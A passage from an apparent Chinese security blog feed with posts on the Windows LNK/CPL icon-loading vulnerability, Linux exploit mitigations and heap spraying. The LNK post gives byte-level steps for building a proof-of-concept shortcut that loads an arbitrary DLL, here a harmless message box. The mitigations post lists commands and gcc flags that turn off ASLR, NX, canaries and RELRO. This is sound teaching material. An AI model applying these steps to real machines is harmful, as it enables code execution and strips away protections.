href="https://filippo.io/linux-syscall-table/">Linux Syscall Table</a></p><p>​《CTF竞赛权威指南》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-什么是-shellcode&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是-shellcode&quot;&gt;&lt;/a&gt; 1. 什么是 shellcode ？&lt;/h1&gt;
&lt;p&gt;shellcode 通常用机器语言</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>LNK快捷方式文件漏洞</title>
    <link href="https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-08-01T10:26:50.000Z</published>
    <updated>2022-08-01T10:28:00.356Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="漏洞简介"><a class="markdownIt-Anchor" href="#漏洞简介"></a> 漏洞简介</h1><p>LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就能执行。</p><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><p>既然是快捷方式漏洞，那我们就先了解以下快捷方式文件的格式。</p><h2 id="快捷方式文件的格式"><a class="markdownIt-Anchor" href="#快捷方式文件的格式"></a> 快捷方式文件的格式</h2><p>快捷方式文件的结构是分段式的。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721221346481.png" alt="image-20220721221346481" style="zoom:50%;"><p>触发漏洞的数据保存在 Shell Item Id List 段中，所以我们只介绍该段的数据结构。</p><p>Shell Item Id List 段为可选段，一个快捷方式文件中是否存在 Shell Item Id List 段是由文件头中偏移 0x14 位置处的值来决定，0bit 值为 1 时，表示该 lnk 文件包含该结构。同时如果存在该结构，偏移 0x4c 的位置的会存在一个 unsigned short int 型的变量，用来标识 Shell Item Id List 结构的大小，紧随其后的为一系列的 SHITEMID 结构，该结构体定义如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHITEMID</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cb;<span class="comment">//cb标识一项SHITEMID结构大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> abID[<span class="number">0</span>];<span class="comment">//abID是可变结构，</span></span><br><span class="line">    <span class="comment">//存储具体数据，但第0项里面的</span></span><br><span class="line">    <span class="comment">//数据是不能修改的，</span></span><br><span class="line">    <span class="comment">//否则.lnk文件无法运行。</span></span><br><span class="line">&#125;SHITEMID,*LPSHITEMID;</span><br></pre></td></tr></table></figure><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721222609971.png" alt="image-20220721222609971" style="zoom: 33%;"><p>漏洞触发的原理：SHELL32.DLL 在根据 Shell Item Id 加载快捷方式图标的时候未对被加载的项目（DLL 或者 CPL）进行有效性校验，造成了攻击者可能通过构造特殊的 Shell Item Id 来加载恶意的 DLL。</p><h2 id="漏洞文件生成"><a class="markdownIt-Anchor" href="#漏洞文件生成"></a> 漏洞文件生成</h2><p>实验环境：windows 2000 sp4</p><p>由于触发这个漏洞需要 CPL 加载机制，所以并不是所有的快捷方式文件都可以触发这个漏洞，只有指向控制面板下面功能的快捷方式才能够出发这个漏洞。</p><ol><li>建立基础 LNK 文件：<br>大家可以通过右键单击控制面板下面的图片，然后选择“创建快捷方式”选项来<strong>建立基础 LNK 文件</strong>。在这我们以“鼠标”为例。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143316381.png" alt="image-20220731143316381" style="zoom: 50%;"><ol start="2"><li>将建立好符合要求的基础 LNK 文件<strong>改造成能够触发漏洞的 POC 文件</strong>：<br>（1）用WinHex打开鼠标.LNK文件，将偏移 0x7A 到 0x7D 的 0x9CFFFFFF 修改为 0x00000000。需要注意的是，如果您在建立基础 LNK 文件时不是使用的“鼠标”项目， 0x7A 到 0x7D 的值可能不是 0x9CFFFFFF。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220726105411454.png" alt="image-20220726105411454" style="zoom: 67%;"><p>​（2）在偏移 0x8E 位置处写入我们要加载的 DLL 地址，在这我们使用 C:\DLL.DLL，其效果是弹出一个“test”对话框，当然您也可以选择使用其他的 DLL 来进行调试。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143558861.png" alt="image-20220731143558861" style="zoom:50%;"><h2 id="漏洞产生原理"><a class="markdownIt-Anchor" href="#漏洞产生原理"></a> 漏洞产生原理</h2><p>这个 POC 的最终目的是加载一个 DLL 文件，所以我们可以先在 LoadLibraryW 函数上设置断点，然后再通过回溯函数调用过程的方式找到上层函数，最终找到出问题的函数。</p><p>首先，我们先用下面的源码 再vc6.0中编写一个能弹出对话框的 DLL 文件，然后把这个文件重命名为 DLL.DLL 并放到 C 盘下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DLL.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule, </span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call, </span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params"> )</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>,<span class="string">&quot;Hello World&quot;</span>,<span class="string">&quot;Test&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再用 OllyDbg 附加到 explorer.exe 的进程上，对 LoadLibraryW 函数设置断点，接下来浏览以下保存我们修改的 LNK 文件的目录。此时，可能会出现两种情况。</p><ol><li>OllyDbg 中断触发。如果是这样我们就能在 view --&gt;Call stack 菜单中查看当前函数调用情况。</li><li>OllyDbg 中断未触发，这是因为您已经浏览过这个目录。由于快捷方式图标的加载具有缓存机制，如果以前已经加载过，现在他就不会再重复加载。此时您可以将 LNK 文件重命名，之后 OllyDbg 中的断点就可以触发了。</li></ol><p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154330734.png" alt="image-20220731154330734"></p><p>中断后，我们能在栈中看到本次 LoadLibraryW 函数调用的 FileName 参数为 “C:\DLL.DLL”，说明我们找对地方了，并且我这里也直接出现了弹出框。如果没有看到这个参数，那就多按几次 F9。</p><p>接下来我们通过 Call stack 查看函数调用情况。<br><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154949928.png" alt="image-20220731154949928"></p><p>shell32在处理lnk文件的时候要把它的图标显示出来，对于一般文件应该是从Icon filename string里面解析，但对于文件后面没有Icon filename string结构的控制面板快捷方式，是直接从0x7A那里的iconindex来解析。当这个iconindex是0的时候，会去加载cpl文件，调用CPlApplet接口，这样就存在执行DLL中代码的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">7D716064    53              push    ebx</span><br><span class="line">7D716065    FF75 10         push    dword ptr [ebp+10]</span><br><span class="line">7D716068    8D5E 0C         lea     ebx, dword ptr [esi+C]</span><br><span class="line">7D71606B    53              push    ebx</span><br><span class="line">7D71606C    FF75 0C         push    dword ptr [ebp+C]      ;C:\dll.dll,0,&lt;-这个0就是从偏移7A那里得到的iconindex</span><br><span class="line">7D71606F    FF15 0015597D   call    dword ptr [&lt;&amp;KERNEL32.lstrcpynW&gt;&gt;; kernel32.lstrcpynW</span><br><span class="line">7D716075    6A 2C           push    2C</span><br><span class="line">7D716077    FF75 0C         push    dword ptr [ebp+C]</span><br><span class="line">7D71607A    FF15 F41B597D   call    dword ptr [&lt;&amp;SHLWAPI.StrChrW&gt;]   ; shlwapi.StrChrW</span><br><span class="line">7D716080    85C0            test    eax, eax</span><br><span class="line">7D716082    74 5D           je      short 7D7160E1</span><br><span class="line">7D716084    66:8320 00      and     word ptr [eax], 0</span><br><span class="line">7D716088    83C0 02         add     eax, 2</span><br><span class="line">7D71608B    50              push    eax</span><br><span class="line">7D71608C    FF15 641C597D   call    dword ptr [&lt;&amp;SHLWAPI.StrToIntW&gt;] ; shlwapi.StrToIntW</span><br><span class="line">7D716092    8B7D 14         mov     edi, dword ptr [ebp+14]</span><br><span class="line">7D716095    8907            mov     dword ptr [edi], eax</span><br><span class="line">7D716097    8B45 18         mov     eax, dword ptr [ebp+18]</span><br><span class="line">7D71609A    C700 02000000   mov     dword ptr [eax], 2</span><br><span class="line">7D7160A0    8B0F            mov     ecx, dword ptr [edi]</span><br><span class="line">7D7160A2    33D2            xor     edx, edx</span><br><span class="line">7D7160A4    3BCA            cmp     ecx, edx      ;偏移0x7A必须得是0，才会LoadLibary</span><br><span class="line">7D7160A6    75 33           jnz     short 7D7160DB</span><br><span class="line">7D7160A8    C700 1A000000   mov     dword ptr [eax], 1A</span><br><span class="line">7D7160AE    8D86 14020000   lea     eax, dword ptr [esi+214]</span><br><span class="line">7D7160B4    3910            cmp     dword ptr [eax], edx</span><br><span class="line">7D7160B6    8955 0C         mov     dword ptr [ebp+C], edx</span><br><span class="line">7D7160B9    75 16           jnz     short 7D7160D1</span><br><span class="line">7D7160BB    8D4D 0C         lea     ecx, dword ptr [ebp+C]</span><br><span class="line">7D7160BE    51              push    ecx</span><br><span class="line">7D7160BF    8D8E 18020000   lea     ecx, dword ptr [esi+218]</span><br><span class="line">7D7160C5    51              push    ecx</span><br><span class="line">7D7160C6    50              push    eax</span><br><span class="line">7D7160C7    53              push    ebx</span><br><span class="line">7D7160C8    E8 48C4F2FF     call    7D642515      ;这里调用后面</span><br><span class="line"> </span><br><span class="line">后面</span><br><span class="line">7D63866D    FF15 6415597D   call    dword ptr [&lt;&amp;KERNEL32.GetCurrent&gt;; kernel32.GetCurrentProcessId</span><br><span class="line">7D638673    50              push    eax</span><br><span class="line">7D638674    56              push    esi</span><br><span class="line">7D638675    68 00001000     push    100000                           ; UNICODE &quot;f1df_6.0.2600.5512_x-ww_35d4ce83\&quot;</span><br><span class="line">7D63867A    8985 E4FDFFFF   mov     dword ptr [ebp-21C], eax</span><br><span class="line">7D638680    FF15 6815597D   call    dword ptr [&lt;&amp;KERNEL32.OpenProces&gt;; kernel32.OpenProcess</span><br><span class="line">7D638686    3BC6            cmp     eax, esi</span><br><span class="line">7D638688    8985 E8FDFFFF   mov     dword ptr [ebp-218], eax</span><br><span class="line">7D63868E    0F84 E5000000   je      7D638779</span><br><span class="line">7D638694    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D63869A    50              push    eax</span><br><span class="line">7D63869B    FF15 A41C597D   call    dword ptr [&lt;&amp;SHLWAPI.PathFileExi&gt;; shlwapi.PathFileExistsW</span><br><span class="line">7D6386A1    85C0            test    eax, eax</span><br><span class="line">7D6386A3    C785 BCFDFFFF 2&gt;mov     dword ptr [ebp-244], 20</span><br><span class="line">7D6386AD    74 14           je      short 7D6386C3</span><br><span class="line">7D6386AF    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D6386B5    89B5 C0FDFFFF   mov     dword ptr [ebp-240], esi</span><br><span class="line">7D6386BB    8985 C4FDFFFF   mov     dword ptr [ebp-23C], eax</span><br><span class="line">7D6386C1    EB 1A           jmp     short 7D6386DD</span><br><span class="line">7D6386C3    C785 C0FDFFFF 0&gt;mov     dword ptr [ebp-240], 8</span><br><span class="line">7D6386CD    899D C4FDFFFF   mov     dword ptr [ebp-23C], ebx</span><br><span class="line">7D6386D3    C785 D0FDFFFF 7&gt;mov     dword ptr [ebp-230], 7B</span><br><span class="line">7D6386DD    8D85 BCFDFFFF   lea     eax, dword ptr [ebp-244]</span><br><span class="line">7D6386E3    50              push    eax</span><br><span class="line">7D6386E4    FF15 6C15597D   call    dword ptr [&lt;&amp;KERNEL32.CreateActC&gt;; kernel32.CreateActCtxW</span><br><span class="line">7D6386EA    83F8 FF         cmp     eax, -1</span><br><span class="line">7D6386ED    8985 F0FDFFFF   mov     dword ptr [ebp-210], eax</span><br><span class="line">7D6386F3    75 06           jnz     short 7D6386FB</span><br><span class="line">7D6386F5    89B5 F0FDFFFF   mov     dword ptr [ebp-210], esi</span><br><span class="line">7D6386FB    8B3D 8C15597D   mov     edi, dword ptr [&lt;&amp;KERNEL32.Activ&gt;; kernel32.ActivateActCtx</span><br><span class="line">7D638701    8D85 ECFDFFFF   lea     eax, dword ptr [ebp-214]</span><br><span class="line">7D638707    50              push    eax</span><br><span class="line">7D638708    FFB5 F0FDFFFF   push    dword ptr [ebp-210]</span><br><span class="line">7D63870E    FFD7            call    edi</span><br><span class="line">7D638710    33F6            xor     esi, esi</span><br><span class="line">7D638712    46              inc     esi</span><br><span class="line">7D638713    56              push    esi</span><br><span class="line">7D638714    56              push    esi</span><br><span class="line">7D638715    56              push    esi</span><br><span class="line">7D638716    53              push    ebx</span><br><span class="line">7D638717    FF15 00F0787D   call    dword ptr [7D78F000]             ; apphelp.ApphelpCheckExe</span><br><span class="line">7D63871D    85C0            test    eax, eax</span><br><span class="line">7D63871F    75 08           jnz     short 7D638729</span><br><span class="line">7D638721    2185 E0FDFFFF   and     dword ptr [ebp-220], eax</span><br><span class="line">7D638727    EB 0D           jmp     short 7D638736</span><br><span class="line">7D638729    53              push    ebx             ;加载DLL</span><br><span class="line">7D63872A    FF15 A015597D   call    dword ptr [&lt;&amp;KERNEL32.LoadLibrar&gt;; kernel32.LoadLibraryW</span><br><span class="line">7D638730    8985 E0FDFFFF   mov     dword ptr [ebp-220], eax         ; dll.01C00000</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://bbs.pediy.com/thread-117232.htm">LNK快捷方式文件漏洞简要分析</a></p><p>​0day2：软件漏洞分析精要</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#漏洞简介&quot;&gt;&lt;/a&gt; 漏洞简介&lt;/h1&gt;
&lt;p&gt;LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Linux中的保护机制</title>
    <link href="https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2022-08-01T10:24:46.000Z</published>
    <updated>2022-08-01T15:03:15.289Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。</p><h1 id="一canary栈保护"><a class="markdownIt-Anchor" href="#一canary栈保护"></a> 一：canary（栈保护）</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><p>1、gcc -o test test.c // 默认情况下，不开启Canary保护</p><p>2、gcc <strong>-fno-stack-protector</strong> -o test test.c //禁用栈保护</p><p>3、gcc <strong>-fstack-protector</strong> -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</p><p>4、gcc <strong>-fstack-protector-all</strong> -o test test.c //启用堆栈保护，为所有函数插入保护代码</p><h1 id="二nxno-execute"><a class="markdownIt-Anchor" href="#二nxno-execute"></a> 二：NX（no execute）</h1><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p><img src="/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1515742-20190721232115382-1400699323.png" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 例如：</p><p>1、gcc -o test test.c // 默认情况下，开启NX保护</p><p>2、gcc -z execstack -o test test.c // 禁用NX保护</p><p>3、gcc -z noexecstack -o test test.c // 开启NX保护</p><p>在Windows下，类似的概念为DEP（数据执行保护）</p><h1 id="三pieposition-independent-executables"><a class="markdownIt-Anchor" href="#三pieposition-independent-executables"></a> 三：PIE（position-independent executables）</h1><p><strong>位置独立的可执行区域</strong>。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况：</p><p>0 - 表示关闭进程地址空间随机化。</p><p>1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>liunx下关闭PIE的命令如下：</p><p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><p>gcc编译命令：</p><p>1、gcc -o test test.c // 默认情况下，不开启PIE</p><p>2、gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</p><p>3、gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</p><p>4、gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</p><p>5、gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</p><h1 id="四relro-read-only-relocation"><a class="markdownIt-Anchor" href="#四relro-read-only-relocation"></a> 四：RELRO（ read only relocation）</h1><p>在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><p>gcc -o test test.c // 默认情况下，是Partial RELRO</p><p>gcc -z norelro -o test test.c // 关闭，即No RELRO</p><p>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</p><p>gcc -z now -o test test.c // 全部开启</p><h1 id="五-总结"><a class="markdownIt-Anchor" href="#五-总结"></a> 五 总结</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：-z execstack / -z noexecstack (关闭 / 开启)</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li><li>PIE：-no-pie / -pie (关闭 / 开启)</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</li></ul><blockquote><p>参考资料：<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>本文转载于：<a href="https://www.cnblogs.com/ncu-flyingfox/p/11223390.html">狐狸在飞</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。&lt;/p&gt;
&lt;h1 id=&quot;一canary栈保护&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux保护机制" scheme="https://www.rgzzplus.com/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>HeapSpary技术及疑问</title>
    <link href="https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/"/>
    <id>https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/</id>
    <published>2022-07-27T08:08:48.000Z</published>
    <updated>2022-07-27T08:10:06.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"><a class="markdownIt-Anchor" href="#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"></a> 为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</h2><p>在讨论这个问题之前，先向小白介绍一下<strong>什么是 Heap Spary？</strong></p><p>Heap Spary 又叫堆喷射，是在 shellcode 的前面加上大量的slide code(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得内存被大量的注入代码占据。然后通过结合其他漏洞控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p><hr><p><strong>Heap Spary 执行流程：</strong></p><p><em>堆喷射将 shellcode放置在了堆中，在堆中执行代码。</em></p><ol><li><p>使用浏览器程序打开我们的poc样本时，它会执行我们样本文件中的JavaScript代码。</p></li><li><p>控制程序eip，使其指向0x0C0C0C0C地址。</p></li></ol><hr><p>了解到 Heap Spary 后，再来讨论，<strong>为什么一定要用 0x0C0C0C0C 填充滑板指令？</strong></p><p>（1）0x0C0C0C0C会被程序解释成 OR AL,0C 可以作为滑板指令（即<strong>执行此种指令不会对程序的后续行为产生影响</strong>），有人说为什么不使用0x90（也是滑板指令）呢？请看下一条。</p><p>（2）之前说过，我们的shellcode会被放到堆中去执行，也就是所谓的使eip指向0x0C0C0C0C这个地址，而0x0C0C0C0C这个地址从0计算的话，大概在192mb左右，但0x90909090就不言而喻了，需要申请的堆空间那就相当大了。</p><hr><p>又有人会说<strong>为甚麽一定要让我们的eip指向0x0C0C0C0C呢？</strong></p><p>堆喷射成功的前提是，我们填充的过程中恰好覆盖了一个虚函数指针，当该虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，过程如下：</p><p><img src="https://img-blog.csdnimg.cn/20200313193154842.png" alt="img"></p><p>因此根据上述过程，当我们使用“0c0c0c0c”作为slide code进行填充时，我们地址0x0c0c0c0c处也必须为“0c0c0c0c”，而正由于这个地址是自指向的，因此恰好执行“0c0c0c0c”命令直到执行shellcode。若为其他地址，将会导致指针跳转至其他地方，无法确保完成shellcode的执行。<br>  也可以通过缓冲区溢出漏洞将EIP修改为0x0c0c0c0c就能跳转到该位置，然后完成shellcode的执行。</p><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/m0_46161993/article/details/104846792">Heap Spary原理</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/50891465">初识堆喷射及事例(暴雷漏洞)分析</a></p><p>​<a href="https://www.zhihu.com/question/36171464">为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;/a&gt; 为什么heap spary要用0x0C0C0C</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="HeapSpary" scheme="https://www.rgzzplus.com/tags/HeapSpary/"/>
    
  </entry>
  
  <entry>
    <title>函数指针</title>
    <link href="https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    <id>https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/</id>
    <published>2022-07-27T07:57:50.000Z</published>
    <updated>2022-08-01T10:30:12.616Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="函数指针的定义"><a class="markdownIt-Anchor" href="#函数指针的定义"></a> 函数指针的定义</h1><p>程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是完全可能的。</p><p>函数指针定义形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">returnType (*pointerName)(param <span class="built_in">list</span>);</span><br><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="type">int</span> (*pf)();</span><br></pre></td></tr></table></figure><p>returnType 为函数返回值类型，pointerNmae 为指针名称，param list 为函数参数列表。参数列表中可以同时给出参数的类型和名称，也可以只给出参数的类型，省略参数的名称，这一点和函数原型非常类似。</p><blockquote><p>注意<code>( )</code>的优先级高于<code>*</code>，第一个括号不能省略，如果写作<code>returnType *pointerName(param list);</code>就成了函数原型，它表明函数的返回值类型为<code>returnType *</code>。</p></blockquote><h1 id="函数指针的用法"><a class="markdownIt-Anchor" href="#函数指针的用法"></a> 函数指针的用法</h1><p>初始化函数指针的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 